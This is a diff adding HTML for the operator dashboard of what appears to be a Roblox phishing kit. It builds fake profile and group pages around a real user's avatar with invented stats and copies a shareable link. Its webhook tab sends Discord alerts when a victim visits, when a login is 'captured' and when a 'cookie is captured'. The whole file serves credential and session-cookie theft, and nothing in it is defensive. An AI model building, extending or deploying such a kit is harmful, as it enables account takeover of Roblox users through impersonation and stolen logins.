+    <div class="modal-overlay" id="profileModal" onclick="closeProfileModal(event)" role="dialog" aria-modal="true" aria-label="Create Link">
+        <div class="profile-creator-panel" onclick="event.stopPropagation()">
+            <div class="pc-header">
+                <div>
+                    <div class="pc-title" id="pcModalTitle">Create Profile Link</div>
+                    <div class="pc-sub" id="pcModalSub">Configure custom avatar, vanity details, and stats.</div>
+                </div>
+                <button class="modal-close-btn" onclick="closeProfileModal()" aria-label="Close">
+                    <svg class="ic" width="16" height="16" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+                </button>
+            </div>
+
+            <div class="pc-tabs" role="tablist">
+                <button class="pc-tab active" data-tab="profile" onclick="switchPcTab('profile',this)">Profile</button>
+                <button class="pc-tab" data-tab="group" onclick="switchPcTab('group',this)">Group</button>
+                <button class="pc-tab" data-tab="webhook" onclick="switchPcTab('webhook',this)">Webhook</button>
+            </div>
+
+            <input type="hidden" id="pcFakeUserId" value="">
+            <input type="hidden" id="pcFakeGroupId" value="">
+
+            <div class="pc-body">
+                <div class="pc-form-col">
+
+                    <!-- PROFILE tab -->
+                    <div class="pc-tab-panel active" id="pct-profile">
+                        <div class="pc-form-grid">
+                            <div class="pc-field">
+                                <label class="pc-label" for="pcRealUsername">Real username</label>
+                                <input class="pc-input" type="text" id="pcRealUsername" placeholder="Roblox username for avatar" oninput="clearPreviewStatus()" autocomplete="off" spellcheck="false">
+                            </div>
+                            <div class="pc-field">
+                                <label class="pc-label" for="pcFakeUsername">Username</label>
+                                <input class="pc-input" type="text" id="pcFakeUsername" placeholder="Displayed username" oninput="liveUpdatePreview()" autocomplete="off" spellcheck="false">
+                            </div>
+                            <div class="pc-field">
+                                <label class="pc-label" for="pcDisplayName">Display name</label>
+                                <input class="pc-input" type="text" id="pcDisplayName" placeholder="Displayed name" oninput="liveUpdatePreview()" autocomplete="off" spellcheck="false">
+                            </div>
+                            <div class="pc-field">
+                                <label class="pc-label" for="pcPremium">Premium</label>
+                                <select class="pc-input" id="pcPremium" onchange="liveUpdatePreview()">
+                                    <option value="No">No</option>
+                                    <option value="Yes">Yes</option>
+                                </select>
+                            </div>
+                            <div class="pc-field">
+                                <label class="pc-label" for="pcFriends">Friends</label>
+                                <input class="pc-input" type="number" id="pcFriends" value="0" min="0" oninput="liveUpdatePreview()">
+                            </div>
+                            <div class="pc-field">
+                                <label class="pc-label" for="pcFollowers">Followers</label>
+                                <input class="pc-input" type="number" id="pcFollowers" value="0" min="0" oninput="liveUpdatePreview()">
+                            </div>
+                            <div class="pc-field">
+                                <label class="pc-label" for="pcFollowings">Following</label>
+                                <input class="pc-input" type="number" id="pcFollowings" value="0" min="0" oninput="liveUpdatePreview()">
+                            </div>
+                            <div class="pc-field">
+                                <label class="pc-label" for="pcStatus">Status</label>
+                                <select class="pc-input" id="pcStatus" onchange="liveUpdatePreview()">
+                                    <option>Online</option>
+                                    <option>In Game</option>
+                                    <option>In Studio</option>
+                                    <option>Offline</option>
+                                </select>
+                            </div>
+                            <div class="pc-field">
+                                <label class="pc-label" for="pcCreationDate">Join date</label>
+                                <input class="pc-input" type="date" id="pcCreationDate">
+                            </div>
+                            <div class="pc-field full">
+                                <label class="pc-label" for="pcBio">Description</label>
+                                <textarea class="pc-input" id="pcBio" placeholder="Profile description…" oninput="liveUpdatePreview()"></textarea>
+                            </div>
+                        </div>
+                        <div id="successPanel" style="display:none;"></div>
+                    </div>
+
+                    <!-- GROUP tab -->
+                    <div class="pc-tab-panel" id="pct-group">
+                        <div class="pc-form-grid">
+                            <div class="pc-field">
+                                <label class="pc-label" for="pcGroupName">Group name</label>
+                                <input class="pc-input" type="text" id="pcGroupName" placeholder="Group name…" oninput="liveUpdateGroupPreview()" autocomplete="off" spellcheck="false">
+                            </div>
+                            <div class="pc-field">
+                                <label class="pc-label" for="pcRealGroupId">Real group ID</label>
+                                <input class="pc-input" type="text" id="pcRealGroupId" placeholder="e.g. 32863920" oninput="liveUpdateGroupPreview()" autocomplete="off" spellcheck="false">
+                            </div>
+                            <div class="pc-field">
+                                <label class="pc-label" for="pcGroupMembers">Members</label>
+                                <input class="pc-input" type="number" id="pcGroupMembers" value="0" min="0" oninput="liveUpdateGroupPreview()">
+                            </div>
+                            <div class="pc-field">
+                                <label class="pc-label" for="pcGroupFunds">Funds</label>
+                                <input class="pc-input" type="number" id="pcGroupFunds" value="0" min="0" oninput="liveUpdateGroupPreview()">
+                            </div>
+                            <div class="pc-field">
+                                <label class="pc-label" for="pcGroupOwner">Owner username</label>
+                                <input class="pc-input" type="text" id="pcGroupOwner" placeholder="Owner username…" oninput="liveUpdateGroupPreview()" autocomplete="off" spellcheck="false">
+                            </div>
+                            <div class="pc-field">
+                                <label class="pc-label" for="pcGroupRank">Rank name</label>
+                                <input class="pc-input" type="text" id="pcGroupRank" placeholder="e.g. Member" oninput="liveUpdateGroupPreview()" autocomplete="off" spellcheck="false">
+                            </div>
+                            <div class="pc-field">
+                                <label class="pc-label" for="pcGroupRankNum">Rank number</label>
+                                <input class="pc-input" type="number" id="pcGroupRankNum" value="1" min="1" oninput="liveUpdateGroupPreview()">
+                            </div>
+                            <div class="pc-field">
+                                <label class="pc-label" for="pcGroupLogo">Logo URL</label>
+                                <input class="pc-input" type="text" id="pcGroupLogo" placeholder="https://…" oninput="liveUpdateGroupPreview()" autocomplete="off" spellcheck="false">
+                            </div>
+                            <div class="pc-field full">
+                                <label class="pc-label" for="pcGroupDesc">Description</label>
+                                <textarea class="pc-input" id="pcGroupDesc" placeholder="Group description…" oninput="liveUpdateGroupPreview()"></textarea>
+                            </div>
+                        </div>
+                        <div id="groupLogoPreviewWrap" style="display:none;margin-top:12px;align-items:center;gap:12px;">
+                            <img id="groupLogoPreviewImg" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="Logo preview" style="width:64px;height:64px;border-radius:12px;object-fit:cover;border:1px solid var(--line-strong);background:var(--bg2);">
+                            <span style="font-size:.78rem;color:var(--ink-2);">Logo preview</span>
+                        </div>
+                        <div id="groupSuccessPanel" style="display:none;margin-top:16px;"></div>
+                    </div>
+
+                    <!-- WEBHOOK tab -->
+                    <div class="pc-tab-panel" id="pct-webhook">
+                        <p style="font-size:.84rem;color:var(--ink-2);margin-bottom:20px;line-height:1.6;max-width:60ch;">
+                            Add a Discord webhook for this link to get notified when someone visits or logs in.
+                        </p>
+                        <div class="wh-field">
+                            <label class="wh-label" for="pcWebhookUrl">Webhook URL</label>
+                            <div class="wh-row">
+                                <input class="wh-input" type="text" id="pcWebhookUrl" placeholder="https://discord.com/api/webhooks/…" autocomplete="off" spellcheck="false">
+                                <button class="wh-btn" onclick="testWebhookPing()">Test</button>
+                            </div>
+                        </div>
+                        <div class="wh-field">
+                            <label class="wh-label" for="pcWebhookUrl2">Backup webhook</label>
+                            <input class="wh-input" type="text" id="pcWebhookUrl2" placeholder="Optional backup webhook URL…" autocomplete="off" spellcheck="false">
+                        </div>
+                        <div class="wh-field">
+                            <label class="wh-label" for="pcEmbedColor">Embed color</label>
+                            <input class="wh-input" type="text" id="pcEmbedColor" placeholder="#0071e3" value="#0071e3" style="max-width:180px;" autocomplete="off" spellcheck="false">
+                        </div>
+                        <div class="wh-field">
+                            <span class="wh-label">Notifications</span>
+                            <div style="margin-top:2px;">
+                                <label class="wh-check-row"><input type="checkbox" id="notifyView" checked> Page visited</label>
+                                <label class="wh-check-row"><input type="checkbox" id="notifySignin" checked> Login captured</label>
+                                <label class="wh-check-row"><input type="checkbox" id="notifyToken" checked> Cookie captured</label>
+                            </div>
+                        </div>
+                        <div style="margin-top:20px;">
+                            <button class="wh-btn" onclick="saveWebhookToProfile()">Save webhook</button>
+                        </div>
+                    </div>
+
+                </div>
+
+                <!-- Preview column -->
+                <div class="pc-preview-col">
+                    <div class="preview-label">Preview</div>
+                    <div id="previewStatusRow" class="fetch-status" style="margin-bottom:8px;">
+                        <span class="fetch-dot"></span>
+                        <span id="previewStatusText">Enter a username and click Load avatar</span>
+                    </div>
+
+                    <!-- Profile Preview Card -->
+                    <div class="preview-card" id="previewCard">
+                        <div class="preview-avatar-wrap">
+                            <div class="preview-avatar-bg"></div>
+                            <div class="preview-avatar-placeholder" id="previewAvatarWrap">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" width="30" height="30"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+                            </div>
+                        </div>
+                        <div class="preview-info">
+                            <div class="preview-displayname" id="previewDisplayName">Display Name</div>
+                            <div class="preview-username" id="previewUsername">@username</div>
+                            <div class="preview-status-row">
+                                <span class="preview-status-dot" id="previewStatusDot" style="background:#7d89a3;"></span>
+                                <span id="previewStatusLabel">Offline</span>
+                            </div>
+                            <div class="preview-bio" id="previewBio">No description set.</div>
+                            <div class="preview-stats">
+                                <div class="preview-stat"><div class="preview-stat-val" id="previewFriends">0</div><div class="preview-stat-lbl">Friends</div></div>
+                                <div class="preview-stat"><div class="preview-stat-val" id="previewFollowers">0</div><div class="preview-stat-lbl">Followers</div></div>
+                                <div class="preview-stat"><div class="preview-stat-val" id="previewFollowings">0</div><div class="preview-stat-lbl">Following</div></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Group Preview Card -->
+                    <div class="group-preview-card" id="groupPreviewCard" style="display:none;">
+                        <div class="group-preview-banner"></div>
+                        <div class="group-preview-header">
+                            <div class="group-preview-logo-wrap">
+                                <img id="groupPreviewLogo" src="" alt="Group logo" style="display:none;width:100%;height:100%;object-fit:cover;">
+                                <div id="groupPreviewLogoPlaceholder" class="group-logo-placeholder">
+                                    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+                                </div>
+                            </div>
+                            <div class="group-preview-titles">
+                                <div class="group-preview-name" id="groupPreviewName">My Roblox Group</div>
+                                <div class="group-preview-owner" id="groupPreviewOwner">By @Owner</div>
+                            </div>
+                        </div>
+                        <div class="group-preview-stats">
+                            <div class="group-preview-stat">
+                                <span class="group-preview-stat-val" id="groupPreviewMembers">0</span>
+                                <span class="group-preview-stat-lbl">Members</span>
+                            </div>
+                            <div class="group-preview-stat">
+                                <span class="group-preview-stat-val" id="groupPreviewFunds">0 R$</span>
+                                <span class="group-preview-stat-lbl">Funds</span>
+                            </div>
+                            <div class="group-preview-stat">
+                                <span class="group-preview-stat-val" id="groupPreviewRank">Member</span>
+                                <span class="group-preview-stat-lbl">Rank</span>
+                            </div>
+                        </div>
+                        <div class="group-preview-desc" id="groupPreviewDesc">No description set.</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pc-footer">
+                <button class="pc-preview-btn" id="previewBtn" onclick="fetchRealAvatar()">
+                    <svg class="ic" width="14" height="14" viewBox="0 0 24 24"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
+                    <span>Load avatar</span>
+                </button>
+                <div style="display:flex;gap:10px;">
+                    <button class="pc-preview-btn" id="pcClearBtn" onclick="resetProfileForm()">Clear</button>
+                    <button class="pc-save-btn" id="pcSaveBtn" onclick="saveProfile()">
+                        <svg class="ic" width="16" height="16" viewBox="0 0 24 24"><path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/><polyline points="17 21 17 13 7 13 7 21"/><polyline points="7 3 7 8 15 8"/></svg>
+                        <span>Save &amp; copy link</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ═══ TOOLTIP HELPER ═══ -->
+    <div class="stat-tooltip" id="globalStatTooltip"></div>
+
+    <script src="dashboard.js?v=23"></script>
+</body>
+</html>
